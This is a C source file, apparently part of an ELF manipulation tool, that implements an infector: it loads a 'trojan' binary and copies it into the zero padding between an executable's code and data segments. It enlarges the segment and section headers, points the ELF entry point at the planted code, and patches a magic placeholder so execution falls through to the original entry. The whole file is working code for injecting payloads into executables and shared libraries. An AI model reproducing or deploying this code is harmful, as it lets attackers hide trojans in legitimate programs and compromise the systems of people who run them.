/**
 *  MIT License
 *
 *  Copyright (c) 2021 Carlos Carvalho
 *
 *  Permission is hereby granted, free of charge, to any person obtaining a copy
 *  of this software and associated documentation files (the "Software"), to deal
 *  in the Software without restriction, including without limitation the rights
 *  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 *  copies of the Software, and to permit persons to whom the Software is
 *  furnished to do so, subject to the following conditions:
 *
 *  The above copyright notice and this permission notice shall be included in all
 *  copies or substantial portions of the Software.
 *
 *  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 *  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 *  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 *  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 *  SOFTWARE.
 */

#include "common.h"
#include "utils.h"
#include "log.h"
#include "elfo.h"
#include "infect.h"
#include <assert.h>

/**
 *  Check if the room we find to inject user's trojan
 *  is empty (zeroes)
 */
static bool _inf_check_padding(unsigned char *buf, size_t len) {
    unsigned char zeroes[len];
    memset(zeroes, 0, len);
    if (!memcmp(zeroes, buf, len))
        return true;
    return false;
}

/**
 * Find the magic address that will
 * be replaced by valid one
 */
long * _inf_get_inf_magik(uint8_t *trojan, size_t len, long match)
{
    uint8_t *ptr = trojan;
    for (int i=0 ; i < len ; ++i) {
        long curr = *((long *)&ptr[i]);
        /** is it the same? */
        if (!(match ^ curr))
            return (long*)&ptr[i];
    }
    return NULL;
}

infect_t *inf_load(elf_t *elfo, FILE *trojan, open_mode_t m, long magic) {
    ASSERT_CON_RET_NULL(m == F_RW);
    ASSERT_ARG_RET_NULL(elfo);
    struct mapped_file file_data;

    bool rc = file_load_source(&file_data, trojan);
    if (!rc) {
        log_error("Can't load trojan file\n");
        return NULL;
    }

    long *magic_ptr = _inf_get_inf_magik((uint8_t*)file_data.heap,
            file_data.st.st_size, magic);
    if (!magic_ptr) {
        log_error("Magic not found\n");
        return NULL;
    }

    infect_t *inf = scalloc(1, sizeof(infect_t));
    inf->elfo = elfo;
    inf->magic_ptr = magic_ptr;
    inf->src_bin_size = file_data.st.st_size;
    inf->trojan = file_data.heap;

    return inf;
}

elf_off_t inf_scan_segment(infect_t *inf) {
    ASSERT_ARG_RET_VAL(inf && inf->elfo, 0);

    elf_ehdr_t *ehdr = inf->elfo->ehdr;
    elf_phdr_t **phdrs = inf->elfo->phdrs;
    elf_phdr_t *pdata_after_check = NULL;
    elf_phdr_t *pdata = NULL;
    elf_off_t len = 0;
    bool pass_check = false;
    short found = 0;

    for (int i = 0; i < ehdr->e_phnum && len == 0; ++i) {
        pdata = (*phdrs)++;
        /** .text? */
        if (!(found & PF_X) && pdata->p_type == PT_LOAD /* code */ && pdata->p_flags == (PF_R|PF_X))
        {
            inf->pad.target_offset = pdata->p_offset + pdata->p_filesz;
            /** If ELF is .so = ehdr->e_type */
            inf->pad.lsb_so_addr = inf->pad.target_offset;
            /** If ELF is EXEC = ehdr->e_type, p_filesz: Size of segment in disk */
            inf->pad.lsb_exec_addr = pdata->p_vaddr + pdata->p_filesz;

            /** Save it for now, will write later if check is OK */
            pdata_after_check = pdata;
            found |= PF_X;
            continue;
        }
         /** .data should come just in the next loop after .text */
        if ((found & PF_X) && pdata->p_type == PT_LOAD && pdata->p_flags == (PF_R|PF_W)) {
            /** Total padding size (zeroes) between .text and .data */
            len = pdata->p_offset - inf->pad.lsb_so_addr;
            found |= PF_W;
            break;
        }
    }
    if (!(found & PF_X) || !(found & PF_W)) {
        log_error("Unexpected or missing section(s)\n");
        return false;
    }

    if (len < inf->src_bin_size) {
        log_error("No available space for infection, not written\n");
        return false;
    }

    /** must be only zeroes :) */
    if (_inf_check_padding((unsigned char*)inf->elfo->mapaddr +
                inf->pad.target_offset, len) == true) {
        /** Update to the new mem & file size */
        pdata_after_check->p_memsz = pdata_after_check->p_memsz + inf->src_bin_size;
        pdata_after_check->p_filesz = pdata_after_check->p_filesz + inf->src_bin_size;
        pass_check = true;
    } else {
        log_error("Error: Invalid padding - not all zeroes\n");
        dump_buff_hex((unsigned char *)inf->elfo->mapaddr + inf->pad.target_offset, len);
        printf("\n");
    }

    return (pass_check ? len : 0);
}

bool inf_load_and_patch(infect_t *inf) {
    ASSERT_CON_RET_FALSE(inf && inf->elfo);

    elf_ehdr_t *ehdr = inf->elfo->ehdr;

    elf_off_t curr_sct_offset = 0;
    elf_shdr_t **shdrs = inf->elfo->shdrs;

    /** Save original entry point and re-write new one to ehdr */
    inf->pad.o_entry = ehdr->e_entry;
    if (ehdr->e_type == ET_EXEC)
        ehdr->e_entry = inf->pad.lsb_exec_addr;
    else if (ehdr->e_type == ET_DYN)
        ehdr->e_entry = inf->pad.lsb_so_addr;

    for (int i = 0; i < SHNUM(inf->elfo); ++i, (*shdrs)++) {
        elf_shdr_t *shdr = *shdrs;
        curr_sct_offset = shdr->sh_offset + shdr->sh_size;

        if (inf->pad.target_offset == curr_sct_offset) {
            shdr->sh_size = shdr->sh_size + inf->src_bin_size;
            break;
        }
    }

    /** All good! */
    *(inf->magic_ptr) = inf->pad.o_entry;
    unsigned char *dest = (unsigned char*)inf->elfo->mapaddr + inf->pad.target_offset;
    memcpy(dest, inf->trojan, inf->src_bin_size);

    return true;
}

